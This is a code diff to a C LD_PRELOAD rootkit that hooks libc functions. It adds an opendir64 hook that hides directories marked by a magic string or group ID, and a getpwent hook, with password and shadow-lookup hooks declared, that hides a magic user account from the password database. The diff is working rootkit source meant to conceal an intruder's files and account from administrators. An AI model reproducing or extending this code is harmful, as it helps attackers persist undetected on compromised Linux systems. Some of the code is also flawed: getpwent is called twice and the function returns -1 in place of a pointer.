@@ -14,6 +14,8 @@
 #include <netinet/in.h> 
 #include <dirent.h>
 #include <limits.h> 
+#include <pwd.h> 
+#include <shadow.h> 
 #include "utils/clean.h"
 #include "utils/catflap.h"
 #include "utils/xor.c"
@@ -36,7 +38,8 @@ int (*old_fchdir)(int fildes);
 int (*old_mkdir)(const char *pathname, mode_t mode); 
 int (*old_mkdirat)(int dirfd, const char *pathname, mode_t mode);
 int (*old_rmdir)(const char *pathname); 
-DIR *(*old_opendir)(const char *name); 
+DIR *(*old_opendir)(const char *name);
+DIR *(*old_opendir64)(const char *name);
 DIR *(*old_fdopendir)(int fd);
 
 //file linking functions 
@@ -86,6 +89,13 @@ int (*old_chown)(const char *pathname, uid_t owner, gid_t group);
 int (*old_fchown)(int fd, uid_t owner, gid_t group); 
 int (*old_lchown)(const char *pathname, uid_t owner, gid_t group); 
 gid_t (*old_getgid)(void);
+
+//passwords 
+struct passwd *(*old_getpwent)(void);
+struct passwd *(*old_getpwnam)(const char *name); 
+struct passwd *(*old_getpwuid)(uid_t uid); 
+int (*old_getpwnam_r)(const char *name, struct passwd *pwd, char *buf, size_t buflen, struct passwd **result); 
+struct spwd *(*old_getspnam)(char *name); 
 
 int owned(void)
 { 
@@ -849,6 +859,28 @@ DIR *opendir(const char *name)
 	return old_opendir(name); 
 } 
 
+DIR *opendir64(const char *name)
+{ 
+	HOOK(opendir64); 
+	HOOK(__xstat64); 
+	#ifdef DEBUG 
+	printf("[!] opendir64 hooked\n");
+	#endif 
+
+	struct stat64 filestat; 
+	old___xstat64(_STAT_VER, name, &filestat); 
+	if (owned()) return old_opendir64(name); 
+	char *magic = strdup(MAGIC); xor(magic); 
+	if ((strstr(name, magic)) || filestat.st_gid == MAGICGID)
+	{ 
+		CLEAN(magic); 
+		errno = ENOENT; 
+		return NULL; 
+	} 
+	CLEAN(magic); 
+	return old_opendir64(name); 
+} 
+
 int open(const char *file, int oflag, ...)
 { 
 	HOOK(open); 
@@ -1096,5 +1128,24 @@ int lchown(const char *pathname, uid_t owner, gid_t group)
 	} 
 	CLEAN(magic);
 	return old_lchown(pathname, owner, group); 
+}
+
+struct passwd *getpwent(void)
+{ 
+	HOOK(getpwent); 
+	#ifdef DEBUG 
+	printf("[!] getpwent hooked\n"); 
+	#endif
+
+	struct passwd *pw = old_getpwent(); 
+	if (owned()) return old_getpwent(); 
+	char *user = strdup(MAGIC); xor(user); 
+	if (!strcmp(pw->pw_name, user))
+	{ 
+		CLEAN(user); 
+		errno = ESRCH; //not here!!!
+		return -1; 
+	} 
+	return pw; 
 }
 
